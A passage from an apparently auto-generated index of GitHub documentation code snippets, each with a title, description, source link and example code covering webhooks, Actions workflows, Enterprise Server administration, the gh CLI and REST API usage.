[JavaScript example: Install dependencies](#javascript-example-install-dependencies).\nconst express = require('express');\n\n// This initializes a new Express application.\nconst app = express();\n\n// This defines a POST route at the `/webhook` path. This path matches the path that you specified for the smee.io forwarding. For more information, see [Forward webhooks](#forward-webhooks).\n//\n// Once you deploy your code to a server and update your webhook URL, you should change this to match the path portion of the URL for your webhook.\napp.post('/webhook', express.json({type: 'application/json'}), (request, response) => {\n\n  // Respond to indicate that the delivery was successfully received.\n  // Your server should respond with a 2XX response within {% ifversion fpt or ghec %}10{% else %}30{% endif %} seconds of receiving a webhook delivery. If your server takes longer than that to respond, then {% data variables.product.company_short %} terminates the connection and considers the delivery a failure.\n  response.status(202).send('Accepted');\n\n  // Check the `x-github-event` header to learn what event type was sent.\n  const githubEvent = request.headers['x-github-event'];\n\n  // You should add logic to handle each event type that your webhook is subscribed to.\n  // For example, this code handles the `issues` and `ping` events.\n  //\n  // If any events have an `action` field, you should also add logic to handle each action that you are interested in.\n  // For example, this code handles the `opened` and `closed` actions for the `issue` event.\n  //\n  // For more information about the data that you can expect for each event type, see [AUTOTITLE](/webhooks/webhook-events-and-payloads).\n  if (githubEvent === 'issues') {\n    const data = request.body;\n    const action = data.action;\n    if (action === 'opened') {\n      console.log(`An issue was opened with this title: ${data.issue.title}`);\n    } else if (action === 'closed') {\n      console.log(`An issue was closed by ${data.issue.user.login}`);\n    } else {\n      console.log(`Unhandled action for the issue event: ${action}`);\n    }\n  } else if (githubEvent === 'ping') {\n    console.log('GitHub sent the ping event');\n  } else {\n    console.log(`Unhandled event: ${githubEvent}`);\n  }\n});\n\n// This defines the port where your server should listen.\n// 3000 matches the port that you specified for webhook forwarding. For more information, see [Forward webhooks](#forward-webhooks).\n//\n// Once you deploy your code to a server, you should change this to match the port where your server is listening.\nconst port = 3000;\n\n// This starts the server and tells it to listen at the specified port.\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\n----------------------------------------\n\nTITLE: Requesting and Installing Let's Encrypt certificate - Shell\nDESCRIPTION: This command requests a new TLS certificate from Let's Encrypt and installs it on GitHub Enterprise Server. It uses the ACME protocol to automate the certificate generation and renewal process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-tls.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-ssl-acme -e\n```\n\n----------------------------------------\n\nTITLE: Removing Appliance from HA Configuration\nDESCRIPTION: This snippet shows how to remove an appliance from the high availability configuration on the new primary using the `ghe-repl-teardown` command with the `-u` option specifying the appliance's UUID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/initiating-a-failover-to-your-replica-appliance.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-teardown -u UUID\n```\n\n----------------------------------------\n\nTITLE: Creating issue with multiple labels via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue in a GitHub repository and assign multiple labels using the `labels` query parameter. It assigns both the \"help wanted\" and \"bug\" labels to the new issue.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_4\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?labels=help+wanted,bug\n```\n\n----------------------------------------\n\nTITLE: Fork repository using GitHub CLI\nDESCRIPTION: This command forks a specified repository to the user's account using the GitHub CLI.  It requires the GitHub CLI to be installed and configured with appropriate authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Updating the Pod Specification for the Runner Pod\nDESCRIPTION: This snippet demonstrates how to fully customize the PodSpec of the runner pod by defining properties like image, command, resources, and security context in the `values.yaml` file. The controller will apply this configuration to the runner pod. This allows fine-grained control over the runner environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        resources:\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n              - NET_ADMIN\n```\n\n----------------------------------------\n\nTITLE: Workflow Status Badge with Event Parameter\nDESCRIPTION: This example demonstrates how to use the `event` parameter to display the status of workflow runs triggered by a specific event (e.g., `push`). The resulting badge shows the status of the builds for the current state of that branch.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge.md#_snippet_3\n\nLANGUAGE: Markdown\nCODE:\n```\n![example event parameter](https://github.com/github/docs/actions/workflows/main.yml/badge.svg?event=push)\n```\n\n----------------------------------------\n\nTITLE: Configuring Webhooks for Security Alerts\nDESCRIPTION: This snippet describes how to configure `code_scanning_alert`, `dependabot_alert`, and `secret_scanning_alert` webhooks to receive payloads whenever there is a response to a security alert. It also explains how to define which responses to act on, such as tracking secret scanning alerts created when someone bypasses push protection using the alert property `\"push_protection_bypassed\": true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/getting-started/auditing-security-alerts.md#_snippet_0\n\nLANGUAGE: Other\nCODE:\n```\n`\"push_protection_bypassed\": true`\n```\n\n----------------------------------------\n\nTITLE: Audit Jenkins Instance with Configuration File (Shell)\nDESCRIPTION: This command audits a Jenkins instance using a specified YAML configuration file. The `--output-dir` argument specifies the directory where the audit results will be saved, and `--config-file-path` points to the location of the YAML configuration file. This configuration file defines which Jenkins pipelines to audit and their corresponding file paths.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit jenkins --output-dir path/to/output/ --config-file-path path/to/jenkins/config.yml\n```\n\n----------------------------------------\n\nTITLE: Running specific linter rules\nDESCRIPTION: This command runs a specific set of linter rules on all staged and changed files. Replace `heading-increment code-fence-line-length` with the desired rule names/aliases.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- \\\n  --rules heading-increment code-fence-line-length\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable in devcontainer.json (JSON)\nDESCRIPTION: This code snippet demonstrates how to set a persistent environment variable for all codespaces of a repository by editing the `devcontainer.json` file. The `remoteEnv` property is used to define the variable and its value. This method is suitable for non-sensitive values that can be committed to the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/persisting-environment-variables-and-temporary-files.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"remoteEnv\": {\n    \"VARNAME\": \"value\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Features Section of devcontainer.json\nDESCRIPTION: This snippet shows the `features` section of the `devcontainer.json` file. It includes configuration for `coverage-py`, a code coverage tool for Python. The commented section is an alternative or placeholder for other features to be added.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-python-project-for-codespaces.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n   \"features\": {\n     \"ghcr.io/devcontainers-contrib/features/coverage-py:2\": {}\n   },\n\n   // Features to add to the dev container. More info: https://containers.dev/features.\n   // \"features\": {},\n```\n\n----------------------------------------\n\nTITLE: Navigating to the Cloned Repository Directory\nDESCRIPTION: This snippet illustrates how to change the current directory to the newly cloned repository using the `cd` command. This step is essential for performing subsequent git operations within the cloned repository.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncd FORK-OF-THE-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Starting an interactive rebase with git\nDESCRIPTION: This snippet shows how to start an interactive rebase to modify earlier commits using `git rebase -i <COMMIT-ID>~1`. This requires a properly configured Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\ngit rebase -i <COMMIT-ID>~1\n```\n\n----------------------------------------\n\nTITLE: Declaring Outputs for Composite Actions in YAML\nDESCRIPTION: This example shows how to declare an output for a composite action using YAML. It defines an output named `random-number` and maps its value to the output of a step named `random-number-generator`. The example also includes the `runs` configuration for the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\noutputs:\n  random-number:\n    description: \"Random number\"\n    value: ${{ steps.random-number-generator.outputs.random-id }}\nruns:\n  using: \"composite\"\n  steps:\n    - id: random-number-generator\n      run: echo \"random-id=$(echo $RANDOM)\" >> $GITHUB_OUTPUT\n      shell: bash\n```\n\n----------------------------------------\n\nTITLE: Example client.selection reference\nDESCRIPTION: This code shows an example object for `client.selection`, which represents the selected portion of text the user highlighted in the active file. It includes the reference type, data (content, start, and end positions), ID, is_implicit flag, and metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/context-passing-for-your-agent.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    // The reference type.\n    \"type\": \"client.selection\",\n    \"data\": {\n        // The currently selected portion of text.\n        \"content\": \"<current selection>\",\n        \"end\": {\n            \"col\": 80,\n            \"line\": 10\n        },\n        \"start\": {\n            \"col\": 0,\n            \"line\": 0\n        }\n    },\n    \"id\": \"relative-path/to/file\",\n    // `is_implicit` indicates whether the reference was automatically provided by the client (true) or manually attached by the user (false).\n    \"is_implicit\": true,\n    \"metadata\": {\n        \"display_name\": \"https://github.com/example-user/example-repository\",\n        \"display_icon\": \"\",\n        \"display_url\": \"\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Inbound Email Processing Log\nDESCRIPTION: This text code snippet presents a log from `/var/log/mail-replies/metroplex.log`, illustrating the processing of inbound emails. It shows the metroplex service catching and processing an inbound message and then moving the file to the success directory after processing.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-email-for-notifications.md#_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\n[2014-10-30T00:47:23.306 INFO (5284) #] metroplex: processing <b2b9c260-4aaa-4a93-acbb-0b2ddda68579@me.com>\n[2014-10-30T00:47:23.333 DEBUG (5284) #] Matched /data/user/mail/reply/new/1414630039.Vfc00I12000eM445784.ghe-tjl2-co-ie\n[2014-10-30T00:47:23.334 DEBUG (5284) #] Moving /data/user/mail/reply/new/1414630039.Vfc00I12000eM445784.ghe-tjl2-co-ie => /data/user/incoming-mail/success\n```\n\n----------------------------------------\n\nTITLE: Specifying Operating System in YAML\nDESCRIPTION: This snippet shows how to configure the operating system for the runner that executes the code scanning workflow.  The `runs-on` key specifies the OS (e.g., Ubuntu).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  analyze:\n    name: Analyze\n    runs-on: [ubuntu-latest]\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on repository fork\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a repository is forked.  The `on` keyword specifies the `fork` event.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  fork\n```\n\n----------------------------------------\n\nTITLE: Running config.sh with check option\nDESCRIPTION: This shell command executes the `config.sh` script with the `--check` option. It also passes a `--url` argument with a URL value and a `--pat` argument with a Personal Access Token (PAT) value. This likely checks if the provided URL is valid and uses the PAT for authentication purposes.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/self-hosted-runner-check-mac-linux.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --check --url URL --pat ghp_abcd1234\n```\n\n----------------------------------------\n\nTITLE: Setting the default terminal profile\nDESCRIPTION: This snippet demonstrates how to set the default terminal profile for a specific operating system in VS Code's `settings.json`. Replace `OPERATING-SYSTEM` with the relevant operating system and `SHELL` with the desired shell. This configures VS Code to use the specified shell for new terminal windows.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n   \"terminal.integrated.defaultProfile.OPERATING-SYSTEM\": \"SHELL\"\n\n```\n\n----------------------------------------\n\nTITLE: Creating a new GitHub Enterprise Server VM on Azure - Shell\nDESCRIPTION: This command creates a new virtual machine (VM) on Azure for GitHub Enterprise Server. It requires specifying the VM name, resource group, VM size, region, appliance image name, and premium storage SKU. The command leverages `az vm create` to provision the VM with the provided configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-azure.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\naz vm create -n VM_NAME -g RESOURCE_GROUP --size VM_SIZE -l REGION --image APPLIANCE_IMAGE_NAME --storage-sku Premium_LRS\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions usage\nDESCRIPTION: This snippet demonstrates how to forecast potential GitHub Actions usage using the `gh actions-importer forecast bamboo` command. It computes metrics from completed Bamboo pipeline runs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast bamboo --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: Creating issue with title and labels via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue in a GitHub repository with a pre-defined title and label using query parameters. The `title` parameter sets the issue's title to \"New bug report,\" and the `labels` parameter applies the \"bug\" label.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_2\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?labels=bug&title=New+bug+report\n```\n\n----------------------------------------\n\nTITLE: BibTeX Citation Example\nDESCRIPTION: This is an example of a BibTeX entry generated from the CITATION.cff file. It is used for managing and formatting citations in LaTeX documents.  It includes fields for author, doi, month, title, url, version, and year, and uses the `@software` type.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n@software{Lisa_My_Research_Software_2017,\n  author = {Lisa, Mona and Bot, Hew},\n  doi = {10.5281/zenodo.1234},\n  month = {12},\n  title = {{My Research Software}},\n  url = {https://github.com/github-linguist/linguist},\n  version = {2.0.4},\n  year = {2017}\n}\n```\n\n----------------------------------------\n\nTITLE: Exporting GPG Key\nDESCRIPTION: Exports a GPG key in ASCII armor format using the `gpg --armor --export` command. Requires the GPG key ID as a parameter. The output is the GPG key in a format suitable for adding to a GitHub account.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/generating-a-new-gpg-key.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngpg --armor --export 3AA5C34371567BD2\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with npm\nDESCRIPTION: This step uses the `run` keyword to execute shell commands.  It installs the project dependencies using `npm install`. This step is crucial for setting up the environment before running the ESLint analysis.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Run npm install\n  run: npm install\n```\n\n----------------------------------------\n\nTITLE: Referencing Secret in values.yaml (YAML)\nDESCRIPTION: This YAML snippet shows how to reference the created Kubernetes secret in the `values.yaml` file for actions-runner-controller.  The `githubConfigSecret` property should be set to the name of the created secret ('pre-defined-secret' in this case).  Requires the `values.yaml` file of the actions-runner-controller Helm chart.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/arc-app-post-install-set-secrets.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ngithubConfigSecret: pre-defined-secret\n```\n\n----------------------------------------\n\nTITLE: Setting cutoff date for RSA-SHA1 SSH connections\nDESCRIPTION: This command configures a cutoff date after which the GitHub Enterprise Server instance will deny SSH connections from clients using RSA keys uploaded after the specified date if the connection is signed by the SHA-1 hash function. Replace RFC-3339-UTC-TIMESTAMP with a valid RFC 3339 UTC timestamp.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-ssh-connections-to-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.gitauth.rsa-sha1 RFC-3339-UTC-TIMESTAMP\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow with GITHUB_TOKEN using GitHub CLI - YAML\nDESCRIPTION: This workflow demonstrates adding a label to an issue using the `GITHUB_TOKEN` with GitHub CLI (`gh`). It adds a label to an opened issue, and is intended to not trigger any further workflows that depend on label additions. The workflow is triggered when a new issue is opened.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          ISSUE_URL: {% raw %}${{ github.event.issue.html_url }}{% endraw %}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\"\n```\n\n----------------------------------------\n\nTITLE: Applying Query Suite Instructions - YAML\nDESCRIPTION: This example demonstrates how to apply all instructions from a previously defined `.qls` file using the `apply` instruction. The instructions from the applied file are executed as if they appear in place of the apply instruction. This is useful for reusing conditions across multiple suites.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n- apply: <path-to-query-suite>\n```\n\n----------------------------------------\n\nTITLE: Authenticating with a {% data variables.product.pat_generic %} in JavaScript\nDESCRIPTION: This snippet demonstrates how to authenticate with the {% data variables.product.company_short %} REST API using a {% data variables.product.pat_generic %} with Octokit.js. It initializes an `Octokit` instance with the `auth` parameter set to your {% data variables.product.pat_generic %}.  Replace `YOUR-TOKEN` with your actual {% data variables.product.pat_generic %}. {% ifversion ghes %}Replace `HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: 'YOUR-TOKEN',\n});\n```\n\n----------------------------------------\n\nTITLE: Setting up Zsh alias for GitHub Copilot\nDESCRIPTION: This command appends a line to the .zshrc file to evaluate the output of `gh copilot alias -- zsh`. This creates aliases `ghcs` and `ghce` for `gh copilot suggest` and `gh copilot explain` in the Zsh shell.  The alias allows GitHub Copilot CLI to execute commands.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-the-cli.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\necho 'eval \"$(gh copilot alias -- zsh)\"' >> ~/.zshrc\n```\n\n----------------------------------------\n\nTITLE: Generating new TLS key without passphrase (OpenSSL)\nDESCRIPTION: This snippet demonstrates how to generate a new TLS key without a passphrase using OpenSSL. It utilizes the `openssl rsa` command to read the original key file and output a new key without a passphrase. It requires OpenSSL to be installed on the system. The user will be prompted for the key's passphrase.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nopenssl rsa -in yourdomain.key.orig -out yourdomain.key\n```\n\n----------------------------------------\n\nTITLE: Exposing Local Server with ngrok\nDESCRIPTION: This snippet demonstrates how to expose a locally running server using ngrok to make it accessible to GitHub Copilot. It provides the command to forward HTTP traffic from localhost:3000 to a public ngrok URL.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/quickstart-for-github-copilot-extensions-using-agents.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nngrok http http://localhost:3000\n```\n\n----------------------------------------\n\nTITLE: Disable Ed25519 Host Key - Shell\nDESCRIPTION: This command disables the generation and advertisement of the Ed25519 host key for the GitHub Enterprise Server instance. It configures the `app.babeld.host-key-ed25519` setting to `false`.  This command must be executed via SSH on the appliance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-host-keys-for-your-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.babeld.host-key-ed25519 false\n```\n\n----------------------------------------\n\nTITLE: Dry Run GitLab Pipeline Migration with Source File (Shell)\nDESCRIPTION: This command performs a dry run of a GitLab pipeline migration using a specified source file path. It allows you to test the conversion process without actually creating a pull request.  The `--source-file-path` argument specifies the path to the GitLab CI/CD configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path path/to/.gitlab-ci.yml\n```\n\n----------------------------------------\n\nTITLE: JSON Example for WatchEvent\nDESCRIPTION: This JSON snippet provides an example of the `WatchEvent` object returned by the GitHub Events API. It showcases the structure and fields included in the event, such as the event type, actor, repository, organization, and payload.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/github-event-types.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n[\n  {\n    \"type\": \"WatchEvent\",\n    \"public\": false,\n    \"payload\": {\n    },\n    \"repo\": {\n      \"id\": 3,\n      \"name\": \"octocat/Hello-World\",\n      \"url\": \"https://api.github.com/repos/octocat/Hello-World\"\n    },\n    \"actor\": {\n      \"id\": 1,\n      \"login\": \"octocat\",\n      \"gravatar_id\": \"\",\n      \"avatar_url\": \"https://github.com/images/error/octocat_happy.gif\",\n      \"url\": \"https://api.github.com/users/octocat\"\n    },\n    \"org\": {\n      \"id\": 1,\n      \"login\": \"github\",\n      \"gravatar_id\": \"\",\n      \"url\": \"https://api.github.com/orgs/github\",\n      \"avatar_url\": \"https://github.com/images/error/octocat_happy.gif\"\n    },\n    \"created_at\": \"2011-09-06T17:26:27Z\",\n    \"id\": \"12345\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Compiling JavaScript with Vercel NCC\nDESCRIPTION: These shell commands demonstrate how to use `@vercel/ncc` to compile the JavaScript action's code and dependencies into a single `dist/index.js` file. This reduces the action's size and complexity by bundling all dependencies into a single file for distribution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nnpm i -g @vercel/ncc\n```\n\nLANGUAGE: shell\nCODE:\n```\nncc build index.js --license licenses.txt\n```\n\n----------------------------------------\n\nTITLE: Configuring Reviewers and Assignees in Dependabot YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure Dependabot to automatically add reviewers and assignees to pull requests for npm dependencies. It defines a team and an individual as reviewers, and an individual as an assignee.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# `dependabot.yml` file with\n# reviews and an assignee for all npm pull requests\n\nversion: 2\nupdates:\n  # Keep npm dependencies up to date\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Raise all npm pull requests with reviewers\n    reviewers:\n      - \"my-org/team-name\"\n      - \"octocat\"\n    # Raise all npm pull requests with assignees\n    assignees:\n      - \"user-name\"\n```\n\n----------------------------------------\n\nTITLE: Declaring Kotlin DSL dependency\nDESCRIPTION: This snippet demonstrates how to declare a package dependency using Kotlin DSL in a Gradle project. It specifies the dependency 'com.example:package' for implementation.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ndependencies {\n    implementation(\"com.example:package\")\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Query Suites - YAML\nDESCRIPTION: This example demonstrates how to import queries from an existing query suite using the `import` instruction. The path to the imported suite must be relative to the CodeQL pack containing the current suite definition. This allows for reusing predefined query sets.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\n- import: <path-to-query-suite>\n```\n\n----------------------------------------\n\nTITLE: React Form Generation Prompt Example\nDESCRIPTION: This Markdown snippet demonstrates a prompt file (`New React form.prompt.md`) for generating a new React form component using specific design system components, `react-hook-form` for state management, and `yup` for validation. It includes instructions to ask for form details if not provided and outlines requirements for the form's implementation, emphasizing TypeScript types and UX-friendly validation rules.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/about-customizing-github-copilot-chat-responses.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nYour goal is to generate a new React form component.\n\nAsk for the form name and fields if not provided.\n\nRequirements for the form:\n- Use form design system components: [design-system/Form.md](../docs/design-system/Form.md)\n- Use `react-hook-form` for form state management:\n  - Always define TypeScript types for your form data\n  - Prefer *uncontrolled* components using register\n  - Use `defaultValues` to prevent unnecessary rerenders\n- Use `yup` for validation:\n  - Create reusable validation schemas in separate files\n  - Use TypeScript types to ensure type safety\n  - Customize UX-friendly validation rules\n```\n\n----------------------------------------\n\nTITLE: Converting Language Counts to JSON\nDESCRIPTION: This Ruby snippet converts a hash of language counts into a JSON array, suitable for use with JavaScript libraries like D3.js. It iterates through the `language_obj` hash and pushes each language and its count into a new array of hashes.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nlanguages = []\nlanguage_obj.each do |lang, count|\n  languages.push :language => lang, :count => count\nend\n\nerb :lang_freq, :locals => { :languages => languages.to_json}\n```\n\n----------------------------------------\n\nTITLE: Checking Copilot Status in Vim/Neovim\nDESCRIPTION: This snippet allows users to check the operational status of GitHub Copilot directly within Vim or Neovim. It provides a simple command to verify if Copilot is running correctly and connected.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/troubleshooting-github-copilot/viewing-logs-for-github-copilot-in-your-environment.md#_snippet_1\n\nLANGUAGE: Vim\nCODE:\n```\n:Copilot status\n```\n\n----------------------------------------\n\nTITLE: Custom pagination method using Octokit.js\nDESCRIPTION: This JavaScript code snippet demonstrates how to create a custom pagination method using Octokit.js. It fetches data page by page, parses the data, and accumulates it into a single array.  It uses a regular expression to extract the next page URL from the `link` header.  It includes a `parseData` function to handle different response formats.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",\n{% endif %}});\n\nasync function getPaginatedData(url) {\n  const nextPattern = /(?<=<)([\\S]*)(?=>; rel=\"Next\")/i;\n  let pagesRemaining = true;\n  let data = [];\n\n  while (pagesRemaining) {\n    const response = await octokit.request(`GET ${url}`, {\n      per_page: 100,\n      headers: {\n        \"X-GitHub-Api-Version\":\n          \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    });\n\n    const parsedData = parseData(response.data)\n    data = [...data, ...parsedData];\n\n    const linkHeader = response.headers.link;\n\n    pagesRemaining = linkHeader && linkHeader.includes(`rel=\\\"next\\\"`);\n\n    if (pagesRemaining) {\n      url = linkHeader.match(nextPattern)[0];\n    }\n  }\n\n  return data;\n}\n\nfunction parseData(data) {\n  // If the data is an array, return that\n    if (Array.isArray(data)) {\n      return data\n    }\n\n  // Some endpoints respond with 204 No Content instead of empty array\n  //   when there is no data. In that case, return an empty array.\n  if (!data) {\n    return []\n  }\n\n  // Otherwise, the array of items that we want is in an object\n  // Delete keys that don't include the array of items\n  delete data.incomplete_results;\n  delete data.repository_selection;\n  delete data.total_count;\n  